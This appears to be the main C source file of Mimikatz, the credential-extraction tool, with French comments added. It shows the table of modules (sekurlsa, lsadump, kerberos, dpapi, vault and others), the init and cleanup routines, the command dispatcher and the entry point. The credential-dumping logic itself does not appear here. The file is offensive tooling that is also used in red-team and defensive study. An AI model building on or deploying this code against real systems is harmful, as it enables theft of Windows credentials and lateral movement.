#include "mimikatz.h"

// Déclarations des fonctions
void listModules();
void listModuleCommands(unsigned short indexModule);

// Tableau des modules Mimikatz
const KUHL_M* mimikatz_modules[] = {
    &kuhl_m_standard,
    &kuhl_m_crypto,
    &kuhl_m_sekurlsa,
    &kuhl_m_kerberos,
    &kuhl_m_ngc,
    &kuhl_m_privilege,
    &kuhl_m_process,
    &kuhl_m_service,
    &kuhl_m_lsadump,
    &kuhl_m_ts,
    &kuhl_m_event,
    &kuhl_m_misc,
    &kuhl_m_token,
    &kuhl_m_vault,
    &kuhl_m_minesweeper,
#if defined(NET_MODULE)
    &kuhl_m_net,
#endif
    & kuhl_m_dpapi,
    &kuhl_m_busylight,
    &kuhl_m_sysenv,
    &kuhl_m_sid,
    &kuhl_m_iis,
    &kuhl_m_rpc,
    &kuhl_m_sr98,
    &kuhl_m_rdm,
    &kuhl_m_acr,
};

// Fonction d'initialisation de Mimikatz
void mimikatz_begin()
{
    kull_m_output_init(); // Initialisation de la sortie
    kprintf(L"\n"
        L"  .#####.   " MIMIKATZ_FULL L"\n"
        L" .## ^ ##.  " MIMIKATZ_SECOND L" - (oe.eo)\n"
        L" ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
        L" ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n"
        L" '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n"
        L"  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n");
    mimikatz_initOrClean(TRUE); // Initialisation des modules
}

// Fonction de nettoyage de Mimikatz
void mimikatz_end(NTSTATUS status)
{
    mimikatz_initOrClean(FALSE); // Nettoyage des modules
    kull_m_output_clean(); // Nettoyage de la sortie
    if (status == STATUS_THREAD_IS_TERMINATING)
        ExitThread(STATUS_SUCCESS); // Terminaison du thread
    else
        ExitProcess(STATUS_SUCCESS); // Terminaison du processus
}

// Fonction d'initialisation ou de nettoyage des modules
NTSTATUS mimikatz_initOrClean(BOOL Init)
{
    unsigned short indexModule;
    PKUHL_M_C_FUNC_INIT function;
    long offsetToFunc = Init ? FIELD_OFFSET(KUHL_M, pInit) : FIELD_OFFSET(KUHL_M, pClean);
    NTSTATUS fStatus;
    HRESULT hr;

    if (Init)
    {
        RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
        MIMIKATZ_NT_BUILD_NUMBER &= 0x00007fff;
        hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        if (FAILED(hr))
            PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
        kull_m_asn1_init(); // Initialisation ASN.1
    }

    // Boucle sur tous les modules pour les initialiser ou les nettoyer
    for (indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
    {
        if (function = *(PKUHL_M_C_FUNC_INIT*)((ULONG_PTR)(mimikatz_modules[indexModule]) + offsetToFunc))
        {
            fStatus = function();
            if (!NT_SUCCESS(fStatus))
                kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), mimikatz_modules[indexModule]->shortName, fStatus);
        }
    }

    if (!Init)
    {
        kull_m_asn1_term(); // Terminaison ASN.1
        CoUninitialize(); // Déinitialisation COM
        kull_m_output_file(NULL); // Nettoyage du fichier de sortie
    }
    return STATUS_SUCCESS;
}

// Fonction de dispatch des commandes
NTSTATUS mimikatz_dispatchCommand(wchar_t* input)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    PWCHAR full;
    if (full = kull_m_file_fullPath(input))
    {
        switch (full[0])
        {
        case L'!':
            status = kuhl_m_kernel_do(full + 1); // Commande kernel
            break;
        case L'*':
            status = kuhl_m_rpc_do(full + 1); // Commande RPC
            break;
        default:
            status = mimikatz_doLocal(full); // Commande locale
        }
        LocalFree(full);
    }
    return status;
}

// Fonction de traitement des commandes locales
NTSTATUS mimikatz_doLocal(wchar_t* input)
{
    NTSTATUS status = STATUS_SUCCESS;
    int argc;
    wchar_t** argv = CommandLineToArgvW(input, &argc), * module = NULL, * command = NULL, * match;
    unsigned short indexModule, indexCommand;
    BOOL moduleFound = FALSE, commandFound = FALSE;

    if (argv && (argc > 0))
    {
        if (match = wcsstr(argv[0], L"::"))
        {
            if (module = (wchar_t*)LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
            {
                if ((unsigned int)(match + 2 - argv[0]) < wcslen(argv[0]))
                    command = match + 2;
                RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
            }
        }
        else command = argv[0];

        // Boucle sur les modules pour trouver le module et la commande
        for (indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(mimikatz_modules)); indexModule++)
            if (moduleFound = (!module || (_wcsicmp(module, mimikatz_modules[indexModule]->shortName) == 0)))
                if (command)
                    for (indexCommand = 0; !commandFound && (indexCommand < mimikatz_modules[indexModule]->nbCommands); indexCommand++)
                        if (commandFound = _wcsicmp(command, mimikatz_modules[indexModule]->commands[indexCommand].command) == 0)
                            status = mimikatz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);

        if (!moduleFound)
        {
            PRINT_ERROR(L"\"%s\" module not found !\n", module);
            listModules(); // Liste des modules disponibles
        }
        else if (!commandFound)
        {
            PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, mimikatz_modules[indexModule - 1]->shortName);
            listModuleCommands(indexModule - 1); // Liste des commandes du module
        }

        if (module)
            LocalFree(module);
        LocalFree(argv);
    }
    return status;
}

// Fonction pour lister les modules disponibles
void listModules()
{
    for (unsigned short indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
    {
        kprintf(L"\n%16s", mimikatz_modules[indexModule]->shortName);
        if (mimikatz_modules[indexModule]->fullName)
            kprintf(L"  -  %s", mimikatz_modules[indexModule]->fullName);
        if (mimikatz_modules[indexModule]->description)
            kprintf(L"  [%s]", mimikatz_modules[indexModule]->description);
    }
    kprintf(L"\n");
}

// Fonction pour lister les commandes d'un module
void listModuleCommands(unsigned short indexModule)
{
    kprintf(L"\nModule :\t%s", mimikatz_modules[indexModule]->shortName);
    if (mimikatz_modules[indexModule]->fullName)
        kprintf(L"\nFull name :\t%s", mimikatz_modules[indexModule]->fullName);
    if (mimikatz_modules[indexModule]->description)
        kprintf(L"\nDescription :\t%s", mimikatz_modules[indexModule]->description);
    kprintf(L"\n");

    for (unsigned short indexCommand = 0; indexCommand < mimikatz_modules[indexModule]->nbCommands; indexCommand++)
    {
        kprintf(L"\n%16s", mimikatz_modules[indexModule]->commands[indexCommand].command);
        if (mimikatz_modules[indexModule]->commands[indexCommand].description)
            kprintf(L"  -  %s", mimikatz_modules[indexModule]->commands[indexCommand].description);
    }
    kprintf(L"\n");
}

// Point d'entrée principal
int wmain(int argc, wchar_t* argv[])
{
    NTSTATUS status = STATUS_SUCCESS;
    int i;

    mimikatz_begin(); // Initialisation de Mimikatz
    for (i = 1; (i < argc) && (status != STATUS_PROCESS_IS_TERMINATING) && (status != STATUS_THREAD_IS_TERMINATING); i++)
    {
        kprintf(L"\n" MIMIKATZ L" # %s\n", argv[i]);
        status = mimikatz_dispatchCommand(argv[i]); // Traitement des commandes
    }
    mimikatz_end(status); // Nettoyage de Mimikatz
    return STATUS_SUCCESS;
}
